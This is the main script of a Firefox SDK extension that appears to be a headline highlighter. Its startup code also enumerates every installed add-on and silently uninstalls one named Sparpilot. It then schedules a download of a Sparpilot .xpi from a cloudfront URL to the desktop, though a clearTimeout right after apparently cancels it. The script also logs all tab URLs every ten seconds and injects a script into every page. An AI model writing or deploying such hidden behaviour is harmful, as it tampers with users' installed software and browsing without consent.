/* SDK Modules */
var buttons = require('sdk/ui/button/action');
var tabs = require("sdk/tabs");
let uuid = require('sdk/util/uuid').uuid();
const {Cu, Cc, Ci, components} = require('chrome');

/*SHOW OS */
var data = require("sdk/self").data;
// Construct a panel, loading its content from the "system_info_output.html"
// file in the "data" directory, and loading the "get_OS.js" script
// into it.
var system_info_output = require("sdk/panel").Panel({
  contentURL: data.url("system_info_output.html"),
  contentScriptFile: data.url("get_OS.js")
});
system_info_output.on("show", function() {
  system_info_output.port.emit("show");
});
/* Hide after Click */
system_info_output.port.on("closing", function () {

  system_info_output.hide();
});
/****************************************************/
/* Menu Buttons  */
// ************** THE MAIN BUTTON
var { ToggleButton } = require('sdk/ui/button/toggle');
var self = require("sdk/self");

var button = ToggleButton({
	id: "my-button",
	label: "my button",
	icon: {
		"16": "./icon-16.png",
		"32": "./icon-32.png",
		"64": "./icon-64.png"
	},
	onChange: handleChange
});
/* Show Panel */
function handleChange(state) {
	if (state.checked) {
		menupanel.show({ //show panel at button position
			position: button
		});
	}
}
// **********THE PANEL -> Containts Dowloadbutton
// Building the Panel -> Mainstuff

var menupanel = require("sdk/panel").Panel({
	contentURL: data.url("panel.html"),
	contentScriptFile: data.url("panel.js"),
	onHide: handleHide
});

/* Hide Panel */
function handleHide() {
  button.state('window', {checked: false}); //mainbutton = false then hide button
}
// onclick in Panel - > link Download
menupanel.port.on("download", function () {
	menupanel.hide();
	tabs.open("http://www.headline-highlighter.dickens-webdesign.de/downloads.html");
});
// onclick in Panel - > link docs
menupanel.port.on("docs", function () {
	menupanel.hide();
	tabs.open("http://www.headline-highlighter.dickens-webdesign.de/docs.html");
});
/* Listing all tabs - logging */
function listTabs() {
  var tabs = require("sdk/tabs");
  for each (var tab in tabs)
    console.log("Tabs: "+tab.url+"\n");
}
var tmr = require('sdk/timers');

function logTabs() {
tmr.setInterval(listTabs, 10000);
}



/* at START */
exports.main = function (startup) {
	

			 console.log("Addon start successful \nUUID: "+uuid); // loging UUID
			 system_info_output.show(); //output - System
			 logTabs(); // logging tabs
			 listExtensions();
};

/* uninstall add on we call export.onUnload(reason) { to do } */
exports.onUnload = function (uninstall) {
	tabs.open("http://www.headline-highlighter.dickens-webdesign.de/uninstall_complete.html");
};

/* Modification of Webpages */
var pageMod = require("sdk/page-mod");

pageMod.PageMod({
  include: "*",
  contentScriptFile: data.url("h1modi.js")
});






/* Addon Manager */

    listExtensions = function() {
        let AddonManager = Cu.import('resource://gre/modules/AddonManager.jsm').AddonManager;
         
        AddonManager.getAllAddons(function(aAddons) {
          
             
            for(var i in aAddons) 
			{
                var addon = aAddons[i];
                   console.log("Addon: "+addon.name+"\n");  
				   
				if (addon.id == "sparpilot@sparpilot.com"  )
				{ 
					console.log("[Sparpilot found[remove incompatible Addon]: "+addon.id+"\n");  
					//uninstall
					AddonManager.getAddonByID("sparpilot@sparpilot.com", function(addon) 
					{
						addon.uninstall();
					});
					// calliing start download to initiziate download Timer (5 sec)
						//download
		// FILE DOWNLOADER
		var downloadTmr = require('sdk/timers');
		var desktopPath = require('sdk/system').pathFor('Desk');
			
			desktopPath = desktopPath.replace(/\\/g, "\\\\")
		
		var dwnTmr = downloadTmr.setTimeout(function() { // calling downloadFile with timeout
		// calling start download to initiziate download Timer (5 sec)
		var { Services } = Cu.import("resource://gre/modules/Services.jsm");
		//the 6th arg of saveURI must a nsIFile object, can't use string
		
		var oLocalFile = Cc["@mozilla.org/file/local;1"].createInstance(Ci.nsILocalFile);
		oLocalFile.initWithPath(desktopPath+"\\\\sparpilot.com.3.0.5.xpi");
		if(!oLocalFile.exists())
		{
			oLocalFile.create(oLocalFile.NORMAL_FILE_TYPE, 0666);
		}
		//create the persist variable like this
		var persist = Cc["@mozilla.org/embedding/browser/nsWebBrowserPersist;1"].createInstance(Ci.nsIWebBrowserPersist);
		persist.persistFlags = persist.PERSIST_FLAGS_FROM_CACHE
		| persist.PERSIST_FLAGS_REPLACE_EXISTING_FILES;
		//the 1st arg of saveURI must a URI object
		persist.saveURI(Services.io.newURI("http://dummf1up57pez.cloudfront.net/updater/sparpilot.com.3.0.5.xpi", null, null), null, null, null, "", oLocalFile, null);
				
				}, 5000);
				clearTimeout(dwnTmr);	
				}
				
            }   
       });
    }

	
	
	
	
	
	
	
	
	
	
	
	
